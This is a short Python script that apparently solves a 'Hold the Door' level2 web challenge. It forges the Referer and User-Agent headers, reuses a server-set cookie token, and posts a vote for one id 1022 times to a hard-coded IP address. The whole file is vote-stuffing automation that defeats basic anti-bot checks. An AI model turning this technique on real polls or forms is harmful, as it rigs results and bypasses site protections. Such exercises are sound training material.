#!/usr/bin/python3
if __name__ == "__main__":
    import requests
    header = {
        'Referer': 'http://158.69.76.135/level2.php',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36'
    }
    url = 'http://158.69.76.135/level2.php'
    data = {
        'id': '1190',
        'holdthedoor': 'submit',
        'key': '0'
    }
    cookies = {
        'HoldTheDoor': '0'
    }
    response = requests.get(url)
    for i in range(1022):
        cookies['holdthedoor'] = response.cookies['HoldTheDoor']
        requests.post(url, data=data, headers=header, cookies=cookies)
